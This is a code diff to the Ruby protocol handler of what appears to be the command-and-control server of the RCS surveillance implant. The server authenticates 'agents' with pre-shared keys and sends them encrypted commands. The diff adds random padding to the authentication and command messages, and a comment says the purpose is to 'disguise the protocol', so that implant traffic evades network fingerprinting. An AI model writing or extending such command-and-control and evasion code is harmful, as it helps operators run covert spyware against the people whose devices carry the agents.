@@ -29,15 +29,22 @@ class Protocol
   # ->  Crypt_C ( Kd, NonceDevice, BuildId, InstanceId, SubType, sha1 ( BuildId, InstanceId, SubType, Cb ) )
   # <-  [ Crypt_C ( Ks ), Crypt_K ( NonceDevice, Response ) ]  |  SetCookie ( SessionCookie )
   def self.authenticate(peer, uri, content)
-    trace :info, "[#{peer}] Authentication required..."
+    trace :info, "[#{peer}] Authentication required for (#{content.length.to_s} bytes)..."
 
     # integrity check (104 byte of data, 112 padded)
-    return unless content.length == 112
+    # consider random extra data to disguise the protocol
+    # random bytes < 16 are appended to the message
+    return unless (112..112+16).include? content.length
 
+    # normalize message, chopping random extra data, smaller than 16 bytes
+    content, hasRandBlock = normalize(content)    
+    trace :debug, "[#{peer}] Auth packet size is #{content.length.to_s} bytes"
+    
     # decrypt the message with the per customer signature
     begin
       # the NO_PAD is needed because zeno (Fabrizio Cornelli) has broken his code
       # from RCS 7.x to RCS daVinci. He owes me a beer :)
+      # ind this case the length is 112
       message = aes_decrypt(content, DB.instance.agent_signature, RCS::Crypt::PAD_NOPAD)
     rescue Exception => e
       trace :error, "[#{peer}] Invalid message decryption: #{e.message}"
@@ -77,11 +84,11 @@ class Protocol
     # subtype of the device
     subtype = message.slice!(0..15)
     trace :info, "[#{peer}] Auth -- subtype: " << subtype.delete("\x00")
-
+    
     # identification digest
     sha = message.slice!(0..19)
     trace :debug, "[#{peer}] Auth -- sha: " << sha.unpack('H*').to_s
-
+    
     # get the factory key from the db
     conf_key = DB.instance.factory_key_of build_id_real
 
@@ -90,7 +97,6 @@ class Protocol
       trace :warn, "[#{peer}] Factory key not found"
       return
     end
-
 
     # the server will calculate the same sha digest and authenticate the agent
     # since the conf key is pre-shared
@@ -146,11 +152,11 @@ class Protocol
     end
 
     # complete the message for the agent
-    message += aes_encrypt(nonce + response, k)
+    message += aes_encrypt(nonce + response, k) 
+    message += randblock() if hasRandBlock
 
     return message, 'application/octet-stream', cookie
   end
-
 
   def self.valid_authentication(peer, cookie)
 
@@ -167,7 +173,6 @@ class Protocol
     return valid
   end
 
-
   def self.commands(peer, cookie, content)
     # retrieve the session
     session = SessionManager.instance.get cookie
@@ -183,6 +188,9 @@ class Protocol
       trace :debug, "[#{peer}] has forwarded the connection for [#{session[:ip]}]"
       peer = session[:ip]
     end
+    
+    # normalize message
+    content, hasRandBlock = normalize(content)
 
     begin
       # decrypt the message
@@ -221,9 +229,25 @@ class Protocol
       return
     end
 
+    response += randblock() if hasRandBlock
+    
     return response, 'application/octet-stream', cookie
   end
 
+  # returns a random block of random size < 16
+  def self.randblock()
+    return SecureRandom.random_bytes(SecureRandom.random_number(16))
+  end
+  
+  # normalize a message, cutting at the shorter size multiple of 16
+  def self.normalize(content)
+    newlen = content.length - (content.length % 16)
+    hasRandBlock = newlen != content.length
+    
+    content = content[0..(newlen -1)]
+    return content, hasRandBlock
+  end
+  
   # the protocol is parsed here
   # there are only two phases:
   #   - Authentication
